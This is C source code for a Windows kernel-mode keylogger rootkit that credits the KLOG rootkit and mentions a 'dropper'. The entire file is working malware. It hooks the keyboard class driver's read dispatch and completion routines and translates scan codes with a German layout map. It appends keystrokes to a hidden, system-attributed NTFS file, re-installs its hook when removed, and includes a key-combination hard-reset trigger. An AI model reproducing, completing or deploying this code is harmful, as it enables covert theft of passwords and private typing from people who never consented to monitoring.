#include <ntddk.h>
#include <ntndk.h>
#include <ntddkbd.h>
#include <ntstrsafe.h>
#include "payload.h"
#include "stringpool.h"
#include "settings.h"


///***KLOG rootkit code part by Clandestiny
////////////////////////////////////////////////////////////////////////////   
// SCAN CODE MAP - For the purposes of this driver, the only keys    
// that will be logged are the alphabetical keys, the numeric keys,    
// and the special characters (ie. #,$,%,ect). Keys like, "ENTER",   
// "SHIFT", "ESC", ect will filtered out and not be logged out to the file.   
////////////////////////////////////////////////////////////////////////////   
#define INVALID 0X00 //scan code not supported by this driver   
#define SPACE 0X01 //space bar   
#define ENTER 0X02 //enter key   
#define LSHIFT 0x03 //left shift key   
#define RSHIFT 0x04 //right shift key   
#define CTRL  0x05 //control key   
#define ALT   0x06 //alt key   

char g_keyMap[84] = {
	'²', //0   
	'^', //1   
	'1', //2   
	'2', //3   
	'3', //4   
	'4', //5   
	'5', //6   
	'6', //7   
	'7', //8   
	'8', //9   
	'9', //A   
	'0', //B   
	'ß', //C   
	'´', //D   
	'²', //E   
	'²', //F   
	'q', //10   
	'w', //11   
	'e', //12   
	'r', //13   
	't', //14   
	'z', //15   
	'u', //16   
	'i', //17   
	'o', //18   
	'p', //19   
	'ü', //1A   
	'+', //1B   
	ENTER, //1C   
	CTRL, //1D   
	'a', //1E   
	's', //1F   
	'd', //20   
	'f', //21   
	'g', //22   
	'h', //23   
	'j', //24   
	'k', //25   
	'l', //26   
	'ö', //27   
	'ä', //28   
	'^', //29   
	LSHIFT, //2A   
	'<', //2B   
	'y', //2C   
	'x', //2D   
	'c', //2E   
	'v', //2F   
	'b', //30   
	'n', //31   
	'm', //32   
	',', //33   
	'.', //34   
	'-', //35   
	RSHIFT, //36   
	'²', //37   
	'³', //38   
	SPACE, //39   
	'[', //3A   
	']', //3B   
	'}', //3C   
	'\\', //3D   
	'~', //3E   
	'@', //3F   
	'€', //40   
	'ü', //41   
	'ö', //42   
	'ä', //43   
	'µ', //44   
	'ß', //45   
	'°', //46   
	'7', //47   
	'8', //48   
	'9', //49   
	'²', //4A   
	'4', //4B   
	'5', //4C   
	'6', //4D   
	'²', //4E   
	'1', //4F   
	'2', //50   
	'3', //51   
	'0', //52   
};

///////////////////////////////////////////////////////////////////////   
//The Extended Key Map is used for those scan codes that can map to   
//more than one key.  This mapping is usually determined by the    
//states of other keys (ie. the shift must be pressed down with a letter   
//to make it uppercase).   
///////////////////////////////////////////////////////////////////////   
char g_extendedKeyMap[84] = {
	'²', //0   
	'°', //1   
	'!', //2   
	'"', //3   
	'§', //4   
	'$', //5   
	'%', //6   
	'&', //7   
	'/', //8   
	'(', //9   
	')', //A   
	'=', //B   
	'?', //C   
	'`', //D   
	'²', //E   
	'²', //F   
	'Q', //10   
	'W', //11   
	'E', //12   
	'R', //13   
	'T', //14   
	'Z', //15   
	'U', //16   
	'I', //17   
	'O', //18   
	'P', //19   
	'Ü', //1A   
	'*', //1B   
	ENTER, //1C   
	'²', //1D   
	'A', //1E   
	'S', //1F   
	'D', //20   
	'F', //21   
	'G', //22   
	'H', //23   
	'J', //24   
	'K', //25   
	'L', //26   
	'Ö', //27   
	'Ä', //28   
	'°', //29   
	LSHIFT, //2A   
	'>', //2B   
	'Y', //2C   
	'X', //2D   
	'C', //2E   
	'V', //2F   
	'B', //30   
	'N', //31   
	'M', //32   
	';', //33   
	':', //34   
	'_', //35   
	RSHIFT, //36   
	'²', //37   
	'²', //38   
	SPACE, //39   
	'²', //3A   
	'²', //3B   
	'²', //3C   
	'²', //3D   
	'²', //3E   
	'²', //3F   
	'²', //40   
	'²', //41   
	'²', //42   
	'²', //43   
	'²', //44   
	'²', //45   
	'²', //46   
	'7', //47   
	'8', //48   
	'9', //49   
	'²', //4A   
	'4', //4B   
	'5', //4C   
	'6', //4D   
	'²', //4E   
	'1', //4F   
	'2', //50   
	'3', //51   
	'0', //52   
};
///***END KLOG rootkit code part by Clandestiny


void ConvertScanCodeToKeyCode(PKEY_DATA pKData, char* keyArray);
void ValidateKbdPatch(void);
void UnpatchKbd(PVOID patchKbd);

void WorkerThread(PVOID pStartContext){
	UNREFERENCED_PARAMETER(pStartContext);
	MYDBGPRINT("WorkerThread: Hello from WorkerThread");

	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	ULONG writeLength = 0;
	HANDLE hLogFile = INVALID_HANDLE_VALUE;
	HANDLE hControlFile = INVALID_HANDLE_VALUE;
	PKEY_DATA pKData = NULL;
	PLIST_ENTRY pListEntry = NULL;
	LARGE_INTEGER interval;
	LARGE_INTEGER byteOffset;
	IO_STATUS_BLOCK ioStatusBlock;
	UNICODE_STRING uLogFile;
	UNICODE_STRING uControlFile;
	OBJECT_ATTRIBUTES objectAttributes;
	OBJECT_ATTRIBUTES objectAttributes2;
	FILE_STANDARD_INFORMATION fileStandardInfo;
	WCHAR pszLogFile[MAX_PATH];

	interval.QuadPart = -50000000;

	InitializeListHead(&(g_pKbdHookInfo->queueListHead));
	KeInitializeSpinLock(&(g_pKbdHookInfo->queueSpinLock));
	KeInitializeSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, MAXLONG);

	///Log file hidden by ntfs file system
	RtlStringCbPrintfW(pszLogFile, sizeof(pszLogFile), L"%S\\$KlogFile", g_pCommonStrings->pFileInstallPath);
	//RtlInitUnicodeString(&uLogFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$KlogFile");
	RtlInitUnicodeString(&uLogFile, pszLogFile);
	InitializeObjectAttributes(&objectAttributes, &uLogFile, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	///This file must be placed by user/dropper
	RtlInitUnicodeString(&uControlFile, L"\\??\\C:\\LOGGING_ON");
	InitializeObjectAttributes(&objectAttributes2, &uControlFile, OBJ_KERNEL_HANDLE, NULL, NULL);
	

	ntstatus = ZwCreateFile(&hLogFile, FILE_APPEND_DATA | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
	if (!NT_SUCCESS(ntstatus)){
		MYDBGPRINT("WorkerThread: couldnt create logfile, no klog output available. (0x%lX)", ntstatus);
		hLogFile = INVALID_HANDLE_VALUE;

		ntstatus = ZwDeleteFile(&objectAttributes);
		if (!NT_SUCCESS(ntstatus)){
			
			for (;;){
				MYDBGPRINT("WorkerThread: Cannot renew logfile!");
				//MYDBGPRINT("Failed to open service key for monitoring! 0x%lX", ntstatus);
				//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
				//if (NT_SUCCESS(ntstatus)){
				//	break;
				//}
				//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
				KeDelayExecutionThread(KernelMode, FALSE, &interval);

				//if (!NT_SUCCESS(ntstatus)){
				//	
				//	return;
				//}

			}
			//return;
		}
		ntstatus = ZwCreateFile(&hLogFile, FILE_APPEND_DATA | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
		if (!NT_SUCCESS(ntstatus)){

			for (;;){
				MYDBGPRINT("WorkerThread: Cannot access logfile!");
				//MYDBGPRINT("Failed to open service key for monitoring! 0x%lX", ntstatus);
				//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
				//if (NT_SUCCESS(ntstatus)){
				//	break;
				//}
				//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
				KeDelayExecutionThread(KernelMode, FALSE, &interval);

				//if (!NT_SUCCESS(ntstatus)){
				//	
				//	return;
				//}

			}
			//return;
		}
	}

	ntstatus = ZwQueryInformationFile(hLogFile, &ioStatusBlock, &fileStandardInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(ntstatus)){
		MYDBGPRINT("WorkerThread: Could not get logfile size! (0x%lX)", ntstatus);
		byteOffset.LowPart = 0x0;
	}
	byteOffset.LowPart = fileStandardInfo.EndOfFile.LowPart;


	for (;;){
		ntstatus = KeWaitForSingleObject(&(g_pKbdHookInfo->queueSemaphore), Executive, KernelMode, FALSE, &interval);
		if (STATUS_SUCCESS != ntstatus){
			ValidateKbdPatch();
			continue;
		}

		DbgPrint("WorkerThread: Wait satisfied");

		pListEntry = ExInterlockedRemoveHeadList(&(g_pKbdHookInfo->queueListHead), &(g_pKbdHookInfo->queueSpinLock));
		pKData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
		char keyArray[2] = { 0 };
		ConvertScanCodeToKeyCode(pKData, keyArray);
		ExFreePool(pKData);

		///make sure the key has retuned a valid code before writing it to the file   
		if (0 != *((PWCHAR)keyArray)){

			///Chck if w should log
			ntstatus = ZwOpenFile(&hControlFile, FILE_READ_DATA | SYNCHRONIZE, &objectAttributes2, &ioStatusBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
			if (NT_SUCCESS(ntstatus)){
				ZwClose(hControlFile);

				///make sure our file handle is valid   
				if (0x0 == keyArray[1]){
					writeLength = 1;
				}
				else{
					writeLength = 2;
				}

				///write the data out to a file 
				ntstatus = ZwWriteFile(hLogFile, NULL, NULL, NULL, &ioStatusBlock, &keyArray, writeLength, NULL, NULL);
				if (!NT_SUCCESS(ntstatus)){
					MYDBGPRINT("WorkerThread: Logging failed. (%lX)", ntstatus);
					ZwClose(hLogFile);

					ntstatus = ZwCreateFile(&hLogFile, FILE_APPEND_DATA | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
					if (!NT_SUCCESS(ntstatus)){

						UnpatchKbd(NULL);
						for (;;){
							MYDBGPRINT("WorkerThread: Recreate log file failed (%lX)", ntstatus);
							//MYDBGPRINT("Failed to open service key for monitoring! 0x%lX", ntstatus);
							//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hBcdKey, KEY_NOTIFY | KEY_READ, &objectAttributes);
							//if (NT_SUCCESS(ntstatus)){
							//	break;
							//}
							//MYDBGPRINT("Failed to open BCD key... trying again. (0x%lX)", ntstatus);
							KeDelayExecutionThread(KernelMode, FALSE, &interval);

							//if (!NT_SUCCESS(ntstatus)){
							//	
							//	return;
							//}

						}
						//return;
					} ///end status check
				} ///end status check
			} ///end status check
		} ///end valid keycode check
	} ///inf loop
}


NTSTATUS IrpMjRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp){
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);
	if (NULL != irpStack){

		UnpatchKbd(NULL);
		g_pKbdHookInfo->irpSentDown = TRUE;
		g_pKbdHookInfo->fpOriginalCompletionRoutine = irpStack->CompletionRoutine;
		irpStack->CompletionRoutine = g_pKbdHookInfo->fpHookCompletionRoutine;

		MYDBGPRINT("IrpMjRead: irp mj rad");

		///Forward th IRP always, sinc if somthing wrong, its not our cup of ta.
		///In this case, the kbdclass driver should fix it for us, we do nothing.
		irpStack->Context = NULL;
		irpStack->Control = SL_INVOKE_ON_SUCCESS;
		irpStack->Control |= SL_INVOKE_ON_ERROR;
		irpStack->Control |= SL_INVOKE_ON_CANCEL;
	}
	else{
		///Quite unlikly..
		MYDBGPRINT("IrpMjRead: irpStack NULL, there won't be any completion routine available!");
	} ///end irpstack NULL check

	NTSTATUS ntstatus = (g_pKbdHookInfo->fpOriginalFunction)(pDeviceObject, pIrp);
	return ntstatus;
}


NTSTATUS IrpMjReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext){
	MYDBGPRINT("IrpMjReadCompletion: our complite routine!");

	PKEYBOARD_INPUT_DATA pKeyData;
	PKEY_DATA pKData = NULL;
	KIRQL oldIrql = 0x0;
	int numKeys = 0;
	int i = 0;

	if (NT_SUCCESS(pIrp->IoStatus.Status)){
		pKeyData = pIrp->AssociatedIrp.SystemBuffer;
		numKeys = (int)(pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));
		for (i = 0; i < numKeys; i++) {
			pKData = (PKEY_DATA)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
			pKData->KeyData = (char)pKeyData[i].MakeCode;
			pKData->KeyFlags = (char)pKeyData[i].Flags;

			///Hyperfast shutdown function on {ESC}+{SCRL LK} (hard reset)
			if ((0x01 == pKData->KeyData) && (KEY_MAKE == pKData->KeyFlags)){
				g_pKbdHookInfo->escKeyPressed = TRUE;
			}
			else if ((0x01 == pKData->KeyData) && (KEY_BREAK == pKData->KeyFlags)){
				g_pKbdHookInfo->escKeyPressed = FALSE;
			}
			if ((0x46 == pKData->KeyData) && (KEY_MAKE == pKData->KeyFlags)){
				g_pKbdHookInfo->scrlKeyPressed = TRUE;
			}
			else if ((0x46 == pKData->KeyData) && (KEY_BREAK == pKData->KeyFlags)){
				g_pKbdHookInfo->scrlKeyPressed = FALSE;
			}

			if ((TRUE == g_pKbdHookInfo->escKeyPressed) && (TRUE == g_pKbdHookInfo->scrlKeyPressed)){
				WRITE_PORT_UCHAR((PUCHAR)0x64, 0xFE);
			}

			//Add the scan code to the linked list queue so our worker thread   
			//can write it out to a file.   
			MYDBGPRINT("IrpMjReadCompletion: Adding IRP to work queue %x", pKData->KeyData);
			ExInterlockedInsertTailList(&(g_pKbdHookInfo->queueListHead), &(pKData->ListEntry), &(g_pKbdHookInfo->queueSpinLock));
			KeReleaseSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, 1, FALSE);
			PatchKbd(NULL);
		} ///for end
	} ///success check end

	///A fw safty checks in order to decide whether we should call an original completion routine or not
	if (((ULONG)1 < pIrp->StackCount) && (NULL != g_pKbdHookInfo->fpOriginalCompletionRoutine)){
		if (NULL == pIrp->UserIosb){
			pIrp->UserIosb = &pIrp->IoStatus;
		}
		KeRaiseIrql(HIGH_LEVEL, &oldIrql);
		g_pKbdHookInfo->irpSentDown = FALSE;
		KeLowerIrql(oldIrql);
		return (g_pKbdHookInfo->fpOriginalCompletionRoutine)(pDeviceObject, pIrp, pContext);
	}
	else {
		KeRaiseIrql(HIGH_LEVEL, &oldIrql);
		g_pKbdHookInfo->irpSentDown = FALSE;
		KeLowerIrql(oldIrql);
		return pIrp->IoStatus.Status;
	}
}




///***KLOG rootkit code part by Clandestiny
void ConvertScanCodeToKeyCode(PKEY_DATA pKData, char* keys){
	//get the key code for the corresponding scan code -- whether or not that key   
	//code is extended will be determined later.   
	char key = 0;
	key = g_keyMap[pKData->KeyData];

	switch (key) {
		///////////////////////////////////////   
		//Get and update state of SHIFT key   
		////////////////////////////////////////   
	case LSHIFT:
		if (pKData->KeyFlags == KEY_MAKE)
			g_pKbdHookInfo->kState.kSHIFT = TRUE;
		else
			g_pKbdHookInfo->kState.kSHIFT = FALSE;
		break;

	case RSHIFT:
		if (pKData->KeyFlags == KEY_MAKE)
			g_pKbdHookInfo->kState.kSHIFT = TRUE;
		else
			g_pKbdHookInfo->kState.kSHIFT = FALSE;
		break;

		///////////////////////////////////////   
		//Get and update state of CONTROL key   
		///////////////////////////////////////   
	case CTRL:
		if (pKData->KeyFlags == KEY_MAKE)
			g_pKbdHookInfo->kState.kCTRL = TRUE;
		else
			g_pKbdHookInfo->kState.kCTRL = FALSE;
		break;

		///////////////////////////////////////   
		//Get and update state of ALT key   
		///////////////////////////////////////   
	case ALT:
		if (pKData->KeyFlags == KEY_MAKE)
			g_pKbdHookInfo->kState.kALT = TRUE;
		else
			g_pKbdHookInfo->kState.kALT = FALSE;
		break;

		///////////////////////////////////////   
		//If the space bar was pressed   
		///////////////////////////////////////   
	case SPACE:
		if ((g_pKbdHookInfo->kState.kALT != TRUE) && (pKData->KeyFlags == KEY_BREAK)) //the space bar does not leave    
			keys[0] = 0x20;             //a space if pressed with the ALT key   
		break;

		///////////////////////////////////////   
		//If the enter key was pressed   
		///////////////////////////////////////   
	case ENTER:
		if ((g_pKbdHookInfo->kState.kALT != TRUE) && (pKData->KeyFlags == KEY_BREAK)){ //the enter key does not leave    
			//move to the next line if pressed   
			keys[0] = 0x0D;              //with the ALT key   
			keys[1] = 0x0A;
		}//end if   
		break;

		///////////////////////////////////////////   
		//For all other alpha numeric keys   
		//If the ALT or CTRL key is pressed, do not   
		//convert. If the SHIFT or CAPS LOCK   
		//keys are pressed, switch to the   
		//extended key map. Otherwise return   
		//the current key.   
		////////////////////////////////////////////   
	default:
		if ((g_pKbdHookInfo->kState.kALT != TRUE) && (g_pKbdHookInfo->kState.kCTRL != TRUE) && (pKData->KeyFlags == KEY_BREAK)) //don't convert if ALT or CTRL is pressed   
		{
			if (key >= 0x21){ /*&& (key = 0x7E))*/ //don't convert non alpha numeric keys   
				if (g_pKbdHookInfo->kState.kSHIFT == TRUE)
					keys[0] = g_extendedKeyMap[pKData->KeyData];
				else
					keys[0] = key;
			}//end if   
		}//end if   
		break;
	}//end switch(keys)   
}//end ConvertScanCodeToKeyCode   
///***END KLOG rootkit code part by Clandestiny



NTSTATUS PatchKbd(PVOID patchKbd){
	UNREFERENCED_PARAMETER(patchKbd);

	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	PDRIVER_OBJECT pKbdDrvObj = g_pKbdHookInfo->pKbdDrvObj;

	if (NULL == pKbdDrvObj){
		return ntstatus;
	}
	if (NULL == pKbdDrvObj->DeviceObject){
		return ntstatus;
	}

	if (FALSE == g_pKbdHookInfo->wasPatched){
		g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
		g_pKbdHookInfo->wasPatched = TRUE;
	}

	KIRQL oldIrql;
	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
	KeLowerIrql(oldIrql);
	return STATUS_SUCCESS;
}


void UnpatchKbd(PVOID patchKbd){
	UNREFERENCED_PARAMETER(patchKbd);

	PDRIVER_OBJECT pKbdDrvObj = g_pKbdHookInfo->pKbdDrvObj;

	if (NULL == pKbdDrvObj){
		return;
	}
	if (NULL == pKbdDrvObj->DeviceObject){
		return;
	}
	KIRQL oldIrql;

	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpOriginalFunction;
	KeLowerIrql(oldIrql);
}


void ValidateKbdPatch(void){
	NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
	LARGE_INTEGER timeout;

	if (FALSE == g_pKbdHookInfo->irpSentDown){
		timeout.QuadPart = -5000000;
		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
		if (FALSE == g_pKbdHookInfo->irpSentDown){
			timeout.QuadPart = -5000000;
			KeDelayExecutionThread(KernelMode, FALSE, &timeout);
			if (FALSE == g_pKbdHookInfo->irpSentDown){
				MYDBGPRINT("Multiple waits timed out, repatching!");
				ntstatus = PatchKbd(NULL);
			}
		}
	}

	MYDBGPRINT("Keylogger running correctly, starting next iteration.");
}
